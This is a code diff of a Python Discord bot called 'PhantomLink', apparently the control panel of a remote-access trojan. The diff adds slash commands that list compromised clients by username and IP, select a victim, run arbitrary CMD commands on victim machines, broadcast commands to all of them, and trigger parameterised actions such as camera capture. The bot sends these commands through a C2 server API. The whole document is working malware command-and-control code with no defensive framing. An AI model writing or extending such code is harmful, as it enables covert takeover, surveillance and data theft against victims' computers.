-    param_list = "\n".join([f"`!{k}` - {v['description']}" for k, v in PARAM_COMMANDS.items()])
+    cmd_list = "\n".join([f"`/{k}` - {v['description']}" for k, v in SIMPLE_COMMANDS.items()])
+    param_list = "\n".join([f"`/{k}` - {v['description']}" for k, v in PARAM_COMMANDS.items()])
 
     await channel.send(
-        f"🟢 **PhantomLink Bot Online!**\n\n"
+        f"🟢 **PhantomLink Bot Online!** (Slash Commands Enabled `/`)\n\n"
         f"**Quick Commands:**\n{cmd_list}\n\n"
         f"**Parameter Commands:**\n{param_list}\n\n"
-        f"`!ping` - ทดสอบ\n"
-        f"`!stop` - ปิด Bot\n"
-        f"`!clients` - แสดง client ทั้งหมด\n"
-        f"`!select <id>` - เลือกเป้าหมาย\n"
-        f"`!commands` - แสดงคำสั่งทั้งหมด\n"
-        f"`!cmd <command>` - รันคำสั่ง CMD โดยตรง"
+        f"`/ping` - ทดสอบ\n"
+        f"`/stop` - ปิด Bot\n"
+        f"`/clients` - แสดง client ทั้งหมด\n"
+        f"`/select <id>` - เลือกเป้าหมาย\n"
+        f"`/commands` - แสดงคำสั่งทั้งหมด\n"
+        f"`/cmd <command>` - รันคำสั่ง CMD โดยตรง"
     )
     print("[OK] Sent online message to channel")
 
 
-@client.event
+# ═══════════════════════════════════════════════════════
+# Discord Slash Commands (app_commands)
+# ═══════════════════════════════════════════════════════
+
+@bot.tree.command(name="commands", description="📋 Show all available PhantomLink commands")
+async def slash_commands_list(interaction: discord.Interaction):
+    text = get_commands_list_text()
+    if len(text) > 2000:
+        parts = [text[i:i+1900] for i in range(0, len(text), 1900)]
+        await interaction.response.send_message(parts[0])
+        for p in parts[1:]:
+            await interaction.followup.send(p)
+    else:
+        await interaction.response.send_message(text)
+
+@bot.tree.command(name="cmd", description="💻 Run arbitrary CMD command on client")
+@app_commands.describe(command="Command string to execute on target client")
+async def slash_cmd(interaction: discord.Interaction, command: str):
+    await interaction.response.defer()
+    res = await send_commands_to_clients([command])
+    if len(res) > 1900:
+        res = res[:1900] + "\n... (truncated)"
+    await interaction.followup.send(f"```\n{res}\n```")
+
+@bot.tree.command(name="ping", description="🏓 Check bot latency and connection")
+async def slash_ping(interaction: discord.Interaction):
+    await interaction.response.send_message("🏓 **Pong!** Bot is online and responsive!")
+
+@bot.tree.command(name="clients", description="📋 List connected clients")
+async def slash_clients(interaction: discord.Interaction):
+    await interaction.response.defer()
+    try:
+        req = urllib.request.Request(f"http://{C2_HOST}:{API_PORT}/api/clients")
+        req.add_header('X-API-Key', API_KEY)
+        with urllib.request.urlopen(req, timeout=10) as response:
+            data = json.loads(response.read())
+            clients_list = data.get('clients', [])
+            if not clients_list:
+                await interaction.followup.send("📭 No clients connected.")
+            else:
+                msg = "📋 **Connected Clients:**\n"
+                for c in clients_list:
+                    msg += f"ID: `{c['id']}` - `{c['username']}` @ `{c['ip']}`\n"
+                await interaction.followup.send(msg)
+    except Exception as e:
+        await interaction.followup.send(f"❌ Error getting clients: {e}")
+
+@bot.tree.command(name="select", description="🎯 Select target client ID or 'all'")
+@app_commands.describe(target_id="Client ID or 'all'")
+async def slash_select(interaction: discord.Interaction, target_id: str = "all"):
+    global TARGET_CLIENT
+    TARGET_CLIENT = target_id.strip()
+    await interaction.response.send_message(f"✅ Target set to **Client ID {TARGET_CLIENT}**")
+
+
+# Register dynamic slash commands for simple and param commands
+def _register_dynamic_slash_commands():
+    for cmd_name, info in SIMPLE_COMMANDS.items():
+        if bot.tree.get_command(cmd_name):
+            continue
+        desc = info['description'][:100]
+        
+        def make_simple_callback(c_name=cmd_name, c_cmds=info['commands']):
+            async def callback(interaction: discord.Interaction):
+                await interaction.response.defer()
+                res = await send_commands_to_clients(c_cmds)
+                if res and len(res) > 1900:
+                    res = res[:1900] + "\n... (truncated)"
+                out_msg = f"```\n{res}\n```" if res else "✅ Command sent!"
+                await interaction.followup.send(out_msg)
+            return callback
+
+        cmd = app_commands.Command(
+            name=cmd_name,
+            description=desc,
+            callback=make_simple_callback()
+        )
+        bot.tree.add_command(cmd)
+
+    for cmd_name, info in PARAM_COMMANDS.items():
+        if bot.tree.get_command(cmd_name):
+            continue
+        desc = info['description'][:100]
+
+        def make_param_callback(c_name=cmd_name, c_build=info['build'], p_name=info['param_name']):
+            async def callback(interaction: discord.Interaction, parameter: str = ""):
+                await interaction.response.defer()
+                if not parameter and c_name == 'camera':
+                    parameter = "Integrated Camera"
+                if not parameter:
+                    await interaction.followup.send(f"❌ Missing parameter: `{p_name}`")
+                    return
+                cmds = c_build(parameter)
+                cmds = [c for c in cmds if c is not None]
+                if not cmds:
+                    await interaction.followup.send(f"❌ Invalid parameter: `{parameter}`")
+                    return
+                res = await send_commands_to_clients(cmds)
+                if res and len(res) > 1900:
+                    res = res[:1900] + "\n... (truncated)"
+                out_msg = f"```\n{res}\n```" if res else f"✅ **{c_name}** - Command sent!"
+                await interaction.followup.send(out_msg)
+            return callback
+
+        param_descr = app_commands.describe(parameter=f"Parameter ({info['param_name']})")
+        callback_fn = make_param_callback()
+        callback_fn = param_descr(callback_fn)
+        cmd = app_commands.Command(
+            name=cmd_name,
+            description=desc,
+            callback=callback_fn
+        )
+        bot.tree.add_command(cmd)
+
+_register_dynamic_slash_commands()
+
+
+@bot.event
 async def on_message(message):
     global TARGET_CLIENT
-    if message.author == client.user:
+    if message.author == bot.user:
         return
 
     if message.channel.id != DISCORD_CHANNEL_ID:
         return
 
     content = message.content.strip()
+    if not content:
+        return
+
     content_lower = content.lower()
+    prefix_char = content[0] if content[0] in ["/", "!"] else None
 
+    if prefix_char:
+        raw_token = content_lower[1:].split()[0]
+        alias_map = {
+            "client": "clients",
+            "cilent": "clients",
+            "cilents": "clients",
+            "list": "clients",
+            "targets": "clients",
+            "command": "commands",
+            "help": "commands",
+        }
+        if raw_token in alias_map:
+            mapped = alias_map[raw_token]
+            content_lower = prefix_char + mapped + content_lower[1 + len(raw_token):]
 
-    # ── !clients ──
-    if content_lower == "!clients":
+    # ── /clients or !clients ──
+    if content_lower in ["/clients", "!clients"]:
         try:
             req = urllib.request.Request(f"http://{C2_HOST}:{API_PORT}/api/clients")
             req.add_header('X-API-Key', API_KEY)
@@ -309,8 +690,8 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"❌ Error getting clients: {e}")
 
-    # ── !select ──
-    elif content_lower.startswith("!select"):
+    # ── /select or !select ──
+    elif content_lower.startswith("/select") or content_lower.startswith("!select"):
         parts = content_lower.split()
         if len(parts) == 1:
             TARGET_CLIENT = "all"
@@ -319,38 +700,18 @@ async def on_message(message):
             TARGET_CLIENT = parts[1]
             await message.channel.send(f"✅ Target set to **Client ID {TARGET_CLIENT}**")
 
-    # ── !ping ──
-    elif content_lower == "!ping":
+    # ── /ping or !ping ──
+    elif content_lower in ["/ping", "!ping"]:
         await message.channel.send("🏓 **Pong!** Bot ตอบกลับได้สำเร็จ!")
-        print(f"[OK] Responded to !ping from {message.author}")
 
-    # ── !stop ──
-    elif content_lower == "!stop":
+    # ── /stop or !stop ──
+    elif content_lower in ["/stop", "!stop"]:
         await message.channel.send("🔴 **Bot shutting down...**")
-        print("[*] Stopping bot...")
-        await client.close()
+        await bot.close()
 
-    # ── !commands ──
-    elif content_lower == "!commands":
-        cmd_text = "📋 **PhantomLink Commands**\n\n"
-
-        cmd_text += "**📁 Simple Commands (no parameters):**\n"
-        for k, v in SIMPLE_COMMANDS.items():
-            cmd_text += f"`!{k}` - {v['description']}\n"
-
-        cmd_text += "\n**🔧 Parameter Commands:**\n"
-        for k, v in PARAM_COMMANDS.items():
-            cmd_text += f"`!{k}` - {v['description']}\n"
-
-        cmd_text += "\n**🛠️ Other:**\n"
-        cmd_text += "`!ping` - ทดสอบการเชื่อมต่อ\n"
-        cmd_text += "`!stop` - ปิด Bot\n"
-        cmd_text += "`!clients` - แสดง client ทั้งหมด\n"
-        cmd_text += "`!select <id>` - เลือกเป้าหมาย\n"
-        cmd_text += "`!cmd <command>` - รันคำสั่ง CMD โดยตรง\n"
-        cmd_text += "`!broadcast <command>` - ส่งคำสั่งไปทุก client\n"
-
-        # Split if too long
+    # ── /commands or !commands ──
+    elif content_lower in ["/commands", "!commands"]:
+        cmd_text = get_commands_list_text()
         if len(cmd_text) > 2000:
             parts = [cmd_text[i:i+1900] for i in range(0, len(cmd_text), 1900)]
             for part in parts:
@@ -359,33 +720,33 @@ async def on_message(message):
             await message.channel.send(cmd_text)
 
     # ── Simple commands (no parameters) ──
-    elif content_lower.lstrip("!") in SIMPLE_COMMANDS:
-        cmd_key = content_lower.lstrip("!")
+    elif prefix_char and content_lower[1:] in SIMPLE_COMMANDS:
+        cmd_key = content_lower[1:]
         cmd_info = SIMPLE_COMMANDS[cmd_key]
-        await message.channel.send(f"⏳ Executing `!{cmd_key}`...")
-        print(f"[*] Executing !{cmd_key} from {message.author}")
+        await message.channel.send(f"⏳ Executing `/{cmd_key}`...")
 
-        # Send commands to all connected clients via C2
         result = await send_commands_to_clients(cmd_info['commands'])
         if result:
-            # Truncate if too long
             if len(result) > 1900:
                 result = result[:1900] + "\n... (truncated)"
             await message.channel.send(f"✅ **{cmd_key}** result:\n```\n{result}\n```")
         else:
-            await message.channel.send(f"✅ **{cmd_key}** - Command sent! (check Discord webhook for files)")
+            await message.channel.send(f"✅ **{cmd_key}** - Command sent!")
 
     # ── Parameter commands ──
-    elif content_lower.startswith("!") and content_lower.split()[0].lstrip("!") in PARAM_COMMANDS:
+    elif prefix_char and content_lower[1:].split()[0] in PARAM_COMMANDS:
         parts = content.split(maxsplit=1)
-        cmd_key = parts[0].lstrip("!").lower()
+        cmd_key = parts[0][1:].lower()
         cmd_info = PARAM_COMMANDS[cmd_key]
 
         if len(parts) < 2:
-            await message.channel.send(f"❌ Missing parameter: `{cmd_info['param_name']}`\n{cmd_info['description']}")
-            return
-
-        param = parts[1]
+            if cmd_key == 'camera':
+                param = "Integrated Camera"
+            else:
+                await message.channel.send(f"❌ Missing parameter: `{cmd_info['param_name']}`\n{cmd_info['description']}")
+                return
+        else:
+            param = parts[1]
         commands = cmd_info['build'](param)
         commands = [c for c in commands if c is not None]
 
@@ -393,8 +754,7 @@ async def on_message(message):
             await message.channel.send(f"❌ Invalid parameter: `{param}`")
             return
 
-        await message.channel.send(f"⏳ Executing `!{cmd_key} {param}`...")
-        print(f"[*] Executing !{cmd_key} {param} from {message.author}")
+        await message.channel.send(f"⏳ Executing `/{cmd_key} {param}`...")
 
         result = await send_commands_to_clients(commands)
         if result:
@@ -404,15 +764,14 @@ async def on_message(message):
         else:
             await message.channel.send(f"✅ **{cmd_key}** - Command sent!")
 
-    # ── !cmd <raw command> ──
-    elif content_lower.startswith("!cmd "):
+    # ── /cmd or !cmd <raw command> ──
+    elif content_lower.startswith("/cmd ") or content_lower.startswith("!cmd "):
         raw_cmd = content[5:].strip()
         if not raw_cmd:
-            await message.channel.send("❌ Usage: `!cmd <command>`")
+            await message.channel.send("❌ Usage: `/cmd <command>`")
             return
 
         await message.channel.send(f"⏳ Running: `{raw_cmd[:100]}`...")
-        print(f"[*] Raw CMD from {message.author}: {raw_cmd}")
 
         result = await send_commands_to_clients([raw_cmd])
         if result:
@@ -422,16 +781,15 @@ async def on_message(message):
         else:
             await message.channel.send("✅ Command sent (no output)")
 
-    # ── !broadcast <raw command> ──
-    elif content_lower.startswith("!broadcast ") or content_lower == "!broadcast":
+    # ── /broadcast or !broadcast <raw command> ──
+    elif content_lower.startswith("/broadcast ") or content_lower.startswith("!broadcast "):
         parts = content.split(maxsplit=1)
         if len(parts) < 2:
-            await message.channel.send("❌ Usage: `!broadcast <command>`")
+            await message.channel.send("❌ Usage: `/broadcast <command>`")
             return
 
         raw_cmd = parts[1].strip()
         await message.channel.send(f"📢 **Broadcasting to ALL clients:** `{raw_cmd[:100]}`...")
-        print(f"[*] Broadcast CMD from {message.author}: {raw_cmd}")
 
         orig_target = TARGET_CLIENT
         try:
@@ -446,6 +804,14 @@ async def on_message(message):
             await message.channel.send(f"```\n{result}\n```")
         else:
             await message.channel.send("✅ Broadcast command sent (no output)")
+
+    # ── Unknown command ──
+    elif prefix_char:
+        cmd_name = content.split()[0]
+        await message.channel.send(
+            f"❓ Unknown command: `{cmd_name}`\n"
+            f"Use `/commands` to see all available commands"
+        )
 
 
     # ── Unknown command ──
@@ -471,14 +837,29 @@ async def send_commands_to_clients(commands):
 
 def _check_c2_server():
     """Check if C2 API server is running before sending commands"""
+    for host in [C2_HOST, "127.0.0.1", "localhost"]:
+        try:
+            url = f"http://{host}:{API_PORT}/api/status"
+            req = urllib.request.Request(url)
+            req.add_header('X-API-Key', API_KEY)
+            with urllib.request.urlopen(req, timeout=3) as response:
+                data = json.loads(response.read())
+                if data.get('status') == 'ok':
+                    return True
+        except Exception:
+            pass
+
     try:
-        req = urllib.request.Request(f"http://{C2_HOST}:{API_PORT}/api/status")
-        req.add_header('X-API-Key', API_KEY)
-        with urllib.request.urlopen(req, timeout=5) as response:
-            data = json.loads(response.read())
-            return data.get('status') == 'ok'
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.5)
+        res = s.connect_ex(("127.0.0.1", API_PORT))
+        s.close()
+        if res == 0:
+            return True
     except Exception:
-        return False
+        pass
+
+    return False
 
 
 def _send_commands_sync(commands):
@@ -535,12 +916,21 @@ def _send_commands_sync(commands):
 
 
 async def main():
+    from config import DISCORD_BOT_TOKEN
+    if not DISCORD_BOT_TOKEN or DISCORD_BOT_TOKEN.strip() == "":
+        print("[!] Discord Bot Token is empty!")
+        print("[*] To enable Discord Bot, set PHANTOMLINK_BOT_TOKEN in your .env file or config.py.")
+        print("[*] Note: C2 Server and Discord Webhook notifications will still run normally.")
+        return
+
     try:
-        await client.start(DISCORD_BOT_TOKEN)
+        await bot.start(DISCORD_BOT_TOKEN)
     except discord.LoginFailure:
-        print("[!] Invalid Bot Token!")
+        print("[!] Invalid or Expired Discord Bot Token!")
+        print("[*] Please check PHANTOMLINK_BOT_TOKEN in your .env file.")
+        print("[*] Note: C2 Server and Discord Webhook notifications will still run normally.")
     except Exception as e:
-        print(f"[!] Error: {e}")
+        print(f"[!] Discord Bot Error: {e}")
 
 
 if __name__ == "__main__":
